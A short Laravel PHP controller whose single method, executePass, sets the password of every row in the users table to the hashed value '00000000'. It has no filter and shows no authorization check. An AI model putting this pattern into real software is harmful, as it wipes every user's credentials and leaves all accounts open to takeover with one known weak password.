<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class NameController extends Controller
{
    public function executePass() {
        DB::table('users')
            ->update([
                'password' => Hash::make('00000000')
            ]);
    }
}
